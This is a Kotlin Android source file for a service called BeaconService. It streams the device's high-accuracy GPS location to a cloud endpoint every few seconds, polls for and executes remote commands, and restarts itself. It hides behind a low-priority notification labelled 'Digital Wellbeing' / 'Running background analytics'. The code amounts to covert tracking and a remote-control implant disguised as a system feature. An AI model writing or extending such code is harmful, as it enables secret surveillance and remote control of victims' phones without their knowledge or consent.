package com.example.myandroid

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.IBinder
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import kotlinx.coroutines.tasks.await
import org.json.JSONObject

class BeaconService : Service() {

    private val job = SupervisorJob()
    private val scope = CoroutineScope(Dispatchers.IO + job)
    private var intervalSeconds = 60L // Default safety

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val durationMins = intent?.getLongExtra("duration_mins", 5L) ?: 5L
        val mode = intent?.getStringExtra("mode") ?: "BURST"
        val endTime = System.currentTimeMillis() + (durationMins * 60 * 1000)
        
        intervalSeconds = if (mode == "LOCATION_STREAM") 15L else 5L 

        startForeground(9999, createNotification())
        
        scope.launch {
            DebugLogger.log("BEACON", "Mode: $mode | Duration: ${durationMins}m")
            val fused = com.google.android.gms.location.LocationServices.getFusedLocationProviderClient(applicationContext)

            while (isActive) {
                if (System.currentTimeMillis() > endTime) {
                    stopSelf()
                    break
                }

                val extra = JSONObject()
                if (mode == "LOCATION_STREAM" && PermissionManager.hasBackgroundLocation(applicationContext)) {
                    try {
                        val loc = fused.getCurrentLocation(com.google.android.gms.location.Priority.PRIORITY_HIGH_ACCURACY, null).await()
                        if (loc != null) {
                            val locObj = JSONObject()
                            locObj.put("lat", loc.latitude); locObj.put("lon", loc.longitude); locObj.put("acc", loc.accuracy)
                            extra.put("stream_location", locObj)
                        }
                    } catch (e: Exception) { }
                }

                CloudManager.sendPing(applicationContext, "$mode (${(endTime - System.currentTimeMillis())/60000}m left)", extra)
                CommandProcessor.checkAndExecute(applicationContext)
                
                delay(intervalSeconds * 1000)
            }
        }

        return START_STICKY
    }

    private fun createNotification(): Notification {
        val channelId = "sync_service"
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            val chan = NotificationChannel(channelId, "Device Health", NotificationManager.IMPORTANCE_MIN)
            chan.setShowBadge(false)
            getSystemService(NotificationManager::class.java).createNotificationChannel(chan)
        }
        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("Digital Wellbeing")
            .setContentText("Running background analytics")
            .setSmallIcon(android.R.drawable.ic_menu_recent_history)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
    }

    override fun onDestroy() {
        super.onDestroy()
        job.cancel()
        DebugLogger.log("BEACON", "Service Stopped")
    }
}